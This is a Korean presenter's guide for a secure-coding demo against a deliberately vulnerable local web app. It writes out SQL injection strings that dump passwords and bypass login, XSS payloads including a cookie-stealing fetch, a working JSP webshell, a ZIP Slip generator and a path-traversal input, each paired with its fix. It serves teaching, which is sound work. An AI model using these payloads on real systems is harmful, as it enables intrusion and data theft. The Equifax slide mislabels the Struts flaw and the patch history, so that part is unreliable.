# 시연 순서 가이드

## 1. 발표 배경 (2분) — 슬라이드만

청중이 "이게 왜 중요한가"를 느끼게 만드는 구간

| 연도 | 사고 | 취약점 | 피해 |
|------|------|--------|------|
| 2014 | 한국카드 3사 개인정보 유출 | 내부자 + 접근통제 부재 | 1억 400만 건 |
| 2017 | Equifax | Apache Struts SQL Injection | 1억 4700만 명 |
| 2020 | 솔라윈즈 공급망 공격 | 코드 수준 백도어 | 미국 정부기관 다수 |
| 2021 | Log4Shell | 입력값 검증 미흡 (JNDI Injection) | 전 세계 수억 대 서버 |

> "Equifax 해킹은 패치가 나와 있었지만 적용하지 않은 것이 아닙니다.
> 개발자가 입력값을 검증하지 않은 코드 한 줄이 시작이었습니다."

## 2. 시큐어코딩이란 (2분) — 슬라이드만

버그 vs 취약점 구분:

```
버그       : 의도하지 않은 동작 (기능 오류)
취약점     : 공격자가 악용 가능한 동작 (보안 위협)

모든 취약점은 버그지만, 모든 버그가 취약점은 아님
```

수정 비용 비교 (NIST 기준):

```
설계 단계  : 1
개발 단계  : 10
테스트 단계: 100
운영 이후  : 1,000 ~ 10,000
```

## 3. 주요 취약점 (8분) — 핵심 시연 구간

> 브라우저에서 `http://localhost:8080` 열어둔 상태에서 시작

### 3-1. SQL Injection (3분)

**① 정상 동작 확인 (30초)**
1. `/demo/sql-injection` 이동
2. 검색창에 `수강` 입력, 정상 결과 확인
3. 코드 블록 가리키기 ("어떻게 구현되어 있는지 확인")

**② 검색 SQL Injection 공격 (1분)**
1. 취약 검색창에 `%' OR '1'='1` 입력
2. 실행, 전체 게시글 노출 확인
3. `%' UNION SELECT 1,user_id,user_password,user_name,user_email,user_gender,0 FROM user_tb --` 입력
4. 실행, DB의 모든 계정/비밀번호 노출 확인
5. "쿼리 구조 자체가 바뀐 겁니다"

**③ 로그인 우회 공격 (30초)**
1. 취약 로그인에 ID = `admin' --`, PW = 아무거나 입력
2. 실행, admin 로그인 성공 확인
3. "비밀번호 없이 관리자로 로그인됩니다"

**④ 방어 코드 확인 (1분)**
1. 안전 검색창에 동일한 공격 문자열 입력
2. 실행, 0개 행 반환 확인
3. "PreparedStatement 한 줄로 막힙니다" (코드 비교 가리키기)

### 3-2. XSS (2분 30초)

**① Stored XSS 공격 (1분)**
1. `/demo/xss` 이동
2. 취약 댓글창에 `<script>alert('XSS!')</script>` 입력
3. 등록, 즉시 alert 팝업 확인
4. "이 스크립트는 이 페이지를 여는 모든 사람에게 실행됩니다"
5. 쿠키 탈취 페이로드 입력: `<script>fetch('/demo/steal?c='+document.cookie)</script>`
6. `/demo/steal`에서 수신된 쿠키 확인
7. "실제로는 공격자 서버로 세션 쿠키가 전송됩니다"

**② Reflected XSS (30초)**
1. 취약 반사형 폼에 `<script>alert(1)</script>` 입력
2. 전송, alert 실행 확인
3. "URL 파라미터에 스크립트가 들어가 있습니다. 이 URL을 피해자에게 보내면 됩니다"

**③ 방어 확인 (1분)**
1. 안전 댓글창에 동일한 스크립트 입력
2. 등록, 스크립트가 텍스트로 그대로 출력됨 확인
3. "`th:text` 하나로 막힙니다" (코드 비교 가리키기)
4. 댓글 초기화 버튼 클릭

### 3-3. 파일 업로드 (2분 30초)

**① 사전 준비 (시연 전 미리 준비)**

`webshell.jsp` 내용:
```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",cmd});
    InputStream is = p.getInputStream();
    int c; while((c = is.read()) != -1) out.print((char)c);
%>
```

`zipslip.zip` 생성 (Python):
```python
import zipfile
zf = zipfile.ZipFile('zipslip.zip', 'w')
zf.writestr('../../uploads/pwned.txt', 'ZIP Slip success!')
zf.writestr('normal.txt', 'normal file')
zf.close()
```

**② 취약 업로드 (1분)**
1. `/demo/file-upload` 이동
2. 취약 업로드에 `webshell.jsp` 선택, 업로드
3. 저장 경로 확인 (`uploads/999/webshell.jsp`)
4. 웹쉘 실행 섹션에서 `whoami`, `dir` 등 입력, 서버 명령 실행 확인
5. "확장자 검사가 없으면 실행 파일이 그대로 서버에 올라갑니다"

**③ ZIP Slip 공격 (1분)**
1. 취약 ZIP 해제 섹션에 `zipslip.zip` 선택, 해제
2. 결과에서 실제 저장 경로 확인 (해제 디렉토리 밖으로 탈출)
3. "화이트리스트로 .zip을 허용해도 이 공격은 통과합니다"
4. 안전 ZIP 해제에 동일한 파일, BLOCKED 확인

**④ 방어 확인 (30초)**
1. 안전 업로드에 `webshell.jsp` 선택, 차단 확인
2. 코드 비교 가리키기

### 3-4. 경로 순회 (1분)

1. `/demo/path-traversal` 이동
2. 취약 폼에 `../src/main/resources/application.properties` 입력
3. 실행, DB 비밀번호가 포함된 설정 파일 내용 노출 확인
4. "기준 디렉토리 밖의 파일을 그대로 읽어줍니다"
5. 안전 폼에 동일한 경로 입력, "경로 순회 감지" 차단 확인
6. "`normalize() + startsWith()` 두 줄로 막힙니다" (코드 비교 가리키기)

## 4. 방어 도구 (2분) — 슬라이드만

SAST vs DAST 비교:

```
SAST (정적 분석)
  코드를 실행하지 않고 소스 분석
  도구: SonarQube, Checkmarx, SpotBugs
  장점: 개발 단계에서 조기 발견
  단점: 오탐(False Positive) 많음

DAST (동적 분석)
  실행 중인 앱에 실제 공격 시도
  도구: OWASP ZAP, Burp Suite
  장점: 실제 동작 기반, 미탐 적음
  단점: 커버리지 한계, 늦은 발견
```

> "도구가 잡아주는 것에만 의존하면 안 됩니다.
> PreparedStatement를 쓸지, th:text를 쓸지는
> 결국 개발자의 습관과 코드 리뷰에서 결정됩니다."

## 5. 마무리 (1분) — 슬라이드만

| 오늘 다룬 취약점 | OWASP Top 10 (2021) |
|-----------------|---------------------|
| SQL Injection | A03 (Injection) |
| XSS | A03 (Injection) |
| 파일 업로드 | A04 (Insecure Design) |
| 경로 순회 / ZIP Slip | A01 (Broken Access Control) |

> "OWASP Top 10은 매년 업데이트됩니다.
> 오늘 본 취약점들은 2003년부터 목록에 있었고, 아직도 목록에 있습니다."

## 시연 전 체크리스트

- [ ] `http://localhost:8080` 정상 접속 확인
- [ ] MySQL 서버 실행 중 확인
- [ ] `webshell.jsp` 바탕화면에 준비
- [ ] `zipslip.zip` 바탕화면에 준비 (Python으로 생성)
- [ ] 브라우저 확대 비율 125~150% (청중 가시성)
- [ ] 댓글 초기화 버튼으로 XSS 데모 초기 상태 복원
